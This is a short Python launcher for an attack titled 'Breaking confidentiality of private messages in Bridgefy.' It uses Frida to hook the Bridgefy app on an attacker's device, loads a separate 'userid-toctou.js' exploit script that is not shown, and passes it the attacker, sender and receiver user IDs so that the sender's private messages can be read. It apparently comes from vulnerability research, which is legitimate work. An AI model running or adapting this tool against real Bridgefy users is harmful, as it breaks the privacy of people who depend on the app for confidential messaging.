#!/usr/bin/env python3

import argparse
import frida
import sys

from pathlib import Path


def parse_args():
    parser = argparse.ArgumentParser(description='Breaking confidentiality of private messages in Bridgefy.')
    parser.add_argument('phoneid', type=str, help='The ADB ID of the attacker\'s device.')
    parser.add_argument('appid', type=str, help='The ID of the Bridgefy app.')
    parser.add_argument('--attackerUserId', type=str, required=False, help='The userId of the attacker.')
    parser.add_argument('--receiverUserId', type=str, required=False, help='The userId of the receiver.')
    parser.add_argument('--senderUserId', type=str, required=False, help='The userId of the sender.')
    parser.add_argument('--senderUsername', type=str, required=False, help='The username of the sender.')
    return parser.parse_args()


def on_message(message, data):
    if message['type'] == 'send':
        print(message['payload'])
    else:
        print(message)


def some_or_input(value, prompt):
    if value is None:
        return input(prompt)
    else:
        return value


def main():
    args = parse_args()

    process = frida.get_device_manager().get_device(args.phoneid).attach(args.appid)
    scriptname = Path(__file__).parent / 'userid-toctou.js'

    with open(scriptname) as f:
        script = process.create_script(f.read())

    script.on('message', on_message)
    script.load()

    script.post({
        'type': 'params',
        'attackerUserId': some_or_input(args.attackerUserId, 'attackerUserId: '),
        'receiverUserId': some_or_input(args.receiverUserId, 'receiverUserId: '),
        'senderUserId': some_or_input(args.senderUserId, 'senderUserId: '),
        'senderUsername': some_or_input(args.senderUsername, 'senderUsername: ')
    })

    sys.stdin.read()


if __name__ == '__main__':
    main()
